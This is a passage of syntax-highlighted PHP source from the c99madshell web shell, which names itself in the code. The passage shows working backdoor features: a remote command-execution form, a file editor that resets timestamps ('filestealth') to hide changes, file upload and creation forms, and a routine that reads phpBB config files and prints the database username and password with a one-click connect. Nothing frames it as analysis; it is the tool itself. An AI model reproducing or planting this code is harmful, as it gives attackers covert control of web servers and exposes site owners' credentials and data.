   <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">);</span>
   <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
   <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
   <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
   <span class="nv">$rft</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
   <span class="k">foreach</span><span class="p">(</span><span class="nv">$exeftypes</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$ext</span><span class="p">,</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span><span class="nv">$rft</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span> <span class="k">break</span><span class="p">;}</span>
   <span class="p">}</span>
   <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;%f%&quot;</span><span class="p">,</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$rft</span><span class="p">);</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Execute file:&amp;lt;/b&amp;gt;&amp;lt;form method=POST&amp;gt;&amp;lt;input type=hidden name=act value=cmd&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;Display in text-area&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">cmd_txt</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">d</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Execute</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;sdb&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span> <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$r</span><span class="p">)));</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/pre&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;code&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;php&quot;</span><span class="o">.</span><span class="s2">&quot;BB 2.(.*) auto-generated config file&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">))</span>
   <span class="p">{</span>
    <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$arr</span> <span class="o">==</span> <span class="mi">18</span><span class="p">))</span>
    <span class="p">{</span>
     <span class="k">include</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;phpBB configuration is detected in this file!&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$dbms</span> <span class="o">==</span> <span class="s2">&quot;mysql4&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$dbms</span> <span class="o">=</span> <span class="s2">&quot;mysql&quot;</span><span class="p">;}</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$dbms</span> <span class="o">==</span> <span class="s2">&quot;mysql&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.sql.act.value=&#39;sql&#39;;document.sql.sql_login.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dbuser</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_passwd.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dbpasswd</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_server.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.sql_port.value=&#39;3306&#39;;document.sql.sql_db.value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$dbname</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;;document.sql.submit();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&amp;lt;u&amp;gt;Connect to DB&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;But, you can&#39;t connect to forum sql-base, because db-software=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$dbms</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> is not supported by c99madshell. Please, report us for fix.&quot;</span><span class="p">;}</span>
     <span class="k">echo</span> <span class="s2">&quot;Parameters for manual connect:&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nv">$cfgvars</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;dbms&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbms</span><span class="p">,</span><span class="s2">&quot;dbhost&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbhost</span><span class="p">,</span><span class="s2">&quot;dbname&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbname</span><span class="p">,</span><span class="s2">&quot;dbuser&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbuser</span><span class="p">,</span><span class="s2">&quot;dbpasswd&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbpasswd</span><span class="p">);</span>
     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$cfgvars</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$k</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
   <span class="p">}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div style=</span><span class="se">\&quot;</span><span class="s2">border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: &quot;</span><span class="o">.</span><span class="nv">$highlight_background</span> <span class="o">.</span><span class="s2">&quot;;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$white</span><span class="p">))</span> <span class="p">{</span><span class="o">@</span><span class="nb">ob_clean</span><span class="p">();}</span>
   <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$white</span><span class="p">))</span> <span class="p">{</span><span class="nx">c99shexit</span><span class="p">();}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;download&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">));</span>
   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
   <span class="k">echo</span> <span class="nv">$r</span><span class="p">;</span>
   <span class="k">exit</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;notepad&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: text/plain&quot;</span><span class="p">);</span>
   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;.txt</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">);</span>
   <span class="k">echo</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span>
   <span class="k">exit</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$ft</span> <span class="o">==</span> <span class="s2">&quot;edit&quot;</span><span class="p">)</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span>
   <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$filestealth</span><span class="p">)</span> <span class="p">{</span><span class="nv">$stat</span> <span class="o">=</span> <span class="nb">stat</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);}</span>
    <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Can&#39;t write to file!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
    <span class="k">else</span>
    <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Saved!&amp;lt;/b&amp;gt;&quot;</span><span class="p">;</span>
     <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$edit_text</span><span class="p">);</span>
     <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$filestealth</span><span class="p">)</span> <span class="p">{</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$stat</span><span class="p">[</span><span class="mi">9</span><span class="p">],</span><span class="nv">$stat</span><span class="p">[</span><span class="mi">8</span><span class="p">]);}</span>
     <span class="nv">$r</span> <span class="o">=</span> <span class="nv">$edit_text</span><span class="p">;</span>
    <span class="p">}</span>
   <span class="p">}</span>
   <span class="nv">$rows</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="p">,</span><span class="nv">$r</span><span class="p">));</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;}</span>
   <span class="k">if</span> <span class="p">(</span><span class="nv">$rows</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">30</span><span class="p">)</span> <span class="p">{</span><span class="nv">$rows</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;}</span>
   <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input name=&#39;act&#39; type=&#39;hidden&#39; value=&#39;f&#39;&amp;gt;&amp;lt;input name=&#39;f&#39; type=&#39;hidden&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input name=&#39;ft&#39; type=&#39;hidden&#39; value=&#39;edit&#39;&amp;gt;&amp;lt;input name=&#39;d&#39; type=&#39;hidden&#39; value=&#39;&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">reset</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Reset</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">button</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.todo.act.value=&#39;ls&#39;;document.todo.d.value=&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&#39;;document.todo.submit();</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Back</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=</span><span class="se">\&quot;</span><span class="s2">edit_text</span><span class="se">\&quot;</span><span class="s2"> cols=</span><span class="se">\&quot;</span><span class="s2">122</span><span class="se">\&quot;</span><span class="s2"> rows=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$rows</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$r</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$ft</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of </span><span class="se">\$</span><span class="s2">GLOBALS.&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Unknown extension (&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="o">.</span><span class="s2">&quot;), please, select type manually.&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&quot;</span><span class="p">;}</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;about&quot;</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Webbased shell for administration your resources&amp;lt;br&amp;gt;Credits:&amp;lt;br&amp;gt;Start coding by CCTeaM.&amp;lt;br&amp;gt;&amp;lt;font color=green&amp;gt;Edited and Finished by &amp;lt;b&amp;gt;MADNET&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;ICQ 751777 &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">http://wwp.icq.com/scripts/contact.dll?msgto=751777</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">http://wwp.icq.com/scripts/online.dll?icq=751777&amp;img=5</span><span class="se">\&quot;</span><span class="s2"> border=0 align=absmiddle&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;.&amp;lt;/b&amp;gt;&quot;</span><span class="p">;}</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;a bookmark=&quot;minipanel&quot;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=&quot;1&quot; width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;100%&quot; height=&quot;1&quot; valign=&quot;top&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;p align=&quot;center&quot;&amp;gt;&amp;lt;b&amp;gt;:: &amp;lt;a href=&quot;#&quot; onclick=&quot;document.todo.act.value=&#39;cmd&#39;;document.todo.d.value=&#39;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&#39;;document.todo.submit();&quot;&amp;gt;&amp;lt;b&amp;gt;Command execute&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ::&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Enter: &amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;cmd&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=&quot;50&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;cmd_txt&quot; value=&quot;1&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=submit name=submit value=&quot;Execute&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Select: &amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;cmd&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;select name=&quot;cmd&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$cmdaliases</span> <span class="k">as</span> <span class="nv">$als</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$als</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/option&amp;gt;&quot;</span><span class="p">;}</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/select&amp;gt;&amp;lt;input type=hidden name=&quot;cmd_txt&quot; value=&quot;1&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=submit name=submit value=&quot;Execute&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/TABLE&amp;gt;</span>
<span class="x">&amp;lt;br&amp;gt;</span>
<span class="x">&amp;lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=&quot;1&quot; width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;</span>
<span class="x">&amp;lt;tr&amp;gt;</span>
<span class="x"> &amp;lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;:: &amp;lt;a href=&quot;#&quot; onclick=&quot;document.todo.act.value=&#39;search&#39;;document.todo.submit();&quot;&amp;gt;&amp;lt;b&amp;gt;Search&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ::&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;search&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;search_name&quot; size=&quot;29&quot; value=&quot;(.*)&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=&quot;checkbox&quot; name=&quot;search_name_regexp&quot; value=&quot;1&quot;  checked&amp;gt; - regexp&amp;nbsp;&amp;lt;input type=submit name=submit value=&quot;Search&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x"> &amp;lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;:: &amp;lt;a href=&quot;#&quot; onclick=&quot;document.todo.act.value=&#39;upload&#39;;document.todo.submit();&quot;&amp;gt;&amp;lt;b&amp;gt;Upload&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt; ::&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot; ENCTYPE=&quot;multipart/form-data&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;upload&quot;&amp;gt;&amp;lt;input type=&quot;file&quot; name=&quot;uploadfile&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;miniform&quot; value=&quot;1&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=submit name=submit value=&quot;Upload&quot;&amp;gt;&amp;lt;br&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$wdt</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">&amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;br&amp;gt;&amp;lt;TABLE style=&quot;BORDER-COLLAPSE: collapse&quot; cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=&quot;1&quot; width=&quot;100%&quot; bgColor=#333333 borderColorLight=#c0c0c0 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;:: Make Dir ::&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;mkdir&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;mkdir&quot; size=&quot;50&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=&quot;Create&quot;&amp;gt;&amp;lt;br&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$wdt</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&amp;lt;/form&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;50%&quot; height=&quot;1&quot; valign=&quot;top&quot;&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;:: Make File ::&amp;lt;/b&amp;gt;&amp;lt;form method=&quot;POST&quot;&amp;gt;&amp;lt;input type=hidden name=act value=&quot;mkfile&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;d&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;mkfile&quot; size=&quot;50&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$dispd</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=hidden name=&quot;ft&quot; value=&quot;edit&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=submit value=&quot;Create&quot;&amp;gt;&amp;lt;br&amp;gt;</span><span 